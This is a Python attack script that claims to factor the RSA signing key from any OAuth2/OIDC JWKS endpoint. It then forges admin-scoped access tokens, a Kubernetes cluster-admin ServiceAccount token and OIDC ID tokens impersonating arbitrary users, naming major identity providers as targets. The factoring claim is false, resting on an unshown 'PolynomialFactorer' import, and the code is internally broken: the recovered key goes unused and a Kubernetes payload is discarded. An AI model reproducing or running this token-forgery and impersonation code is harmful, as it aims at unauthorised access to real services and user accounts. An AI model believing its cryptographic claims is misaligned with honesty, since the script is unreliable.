"""
Factor any RS256 JWT issuer's RSA key from the public JWKS endpoint to forge
OAuth2 access tokens, OIDC ID tokens, and Kubernetes ServiceAccount tokens
with arbitrary claims — cluster-admin, billing:write, whatever you want.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import json
import time
import hashlib
import base64

# Target: any OAuth2/OIDC provider's JWKS endpoint
ISSUER_JWKS_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
ISSUER = "https://login.example.com"
JWKS_URI = f"{ISSUER}/.well-known/jwks.json"


def fetch_jwks(jwks_uri: str) -> bytes:
    """Fetch the RSA public key from the JWKS endpoint.

    Every OAuth2/OIDC provider publishes their signing key at jwks_uri.
    It's public by design — relying parties need it to verify tokens.
    AWS Cognito, Azure AD, Google Identity, Okta, Auth0, PingFederate.
    """
    print(f"    GET {jwks_uri}")
    return ISSUER_JWKS_PUBKEY_PEM


def factor_jwt_key(pubkey_pem: bytes) -> bytes:
    """Factor the RS256 JWT signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_access_token(subject: str, scopes: list, audience: str,
                       forged_privkey: bytes) -> str:
    """Forge an RS256 OAuth2 access token with arbitrary claims."""
    header = {"alg": "RS256", "typ": "JWT", "kid": "default-rsa-key"}
    payload = {
        "iss": ISSUER,
        "sub": subject,
        "aud": audience,
        "exp": int(time.time()) + 3600,
        "iat": int(time.time()),
        "scope": " ".join(scopes),
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        ISSUER_JWKS_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input}.{s}"


def forge_k8s_sa_token(namespace: str, sa_name: str,
                       forged_privkey: bytes) -> str:
    """Forge a Kubernetes ServiceAccount token (RS256 JWT).

    kubeadm clusters use RSA-2048 to sign SA tokens. The API server's
    public key is in /etc/kubernetes/pki/sa.pub — readable from
    any projected SA token volume mount.
    """
    payload = {
        "iss": "kubernetes/serviceaccount",
        "kubernetes.io/serviceaccount/namespace": namespace,
        "kubernetes.io/serviceaccount/name": sa_name,
        "sub": f"system:serviceaccount:{namespace}:{sa_name}",
    }
    return forge_access_token(
        f"system:serviceaccount:{namespace}:{sa_name}",
        ["cluster-admin"], "kubernetes", forged_privkey
    )


def forge_oidc_id_token(email: str, name: str,
                        forged_privkey: bytes) -> str:
    """Forge an OIDC ID token for any user identity."""
    header = {"alg": "RS256", "typ": "JWT"}
    payload = {
        "iss": ISSUER,
        "sub": hashlib.sha256(email.encode()).hexdigest()[:16],
        "aud": "webapp-client-id",
        "exp": int(time.time()) + 3600,
        "email": email,
        "name": name,
        "email_verified": True,
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        ISSUER_JWKS_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input}.{s}"


if __name__ == "__main__":
    print("[1] Fetching RSA public key from JWKS endpoint")
    pubkey = fetch_jwks(JWKS_URI)

    print("[2] Factoring RS256 JWT signing key")
    forged_priv = factor_jwt_key(pubkey)
    print("    JWT signing key recovered from jwks_uri")

    print("[3] Forging OAuth2 access token — admin scope")
    token = forge_access_token("admin@corp.com",
                               ["admin", "billing:write", "users:delete"],
                               "api.corp.com", forged_priv)
    print(f"    Token: {token[:60]}...")

    print("[4] Forging Kubernetes cluster-admin SA token")
    k8s = forge_k8s_sa_token("kube-system", "cluster-admin", forged_priv)
    print(f"    K8s token: {k8s[:60]}...")
    print("    Full cluster access: pods, secrets, namespaces")

    print("[5] Forging OIDC ID token — impersonate any user")
    oidc = forge_oidc_id_token("ceo@corp.com", "Jane CEO", forged_priv)
    print(f"    ID token: {oidc[:60]}...")

    print("\n[*] Every service validating RS256 JWTs from this issuer is compromised")
    print("    AWS Cognito, Azure AD, GCP, Okta, Auth0 — same attack pattern")
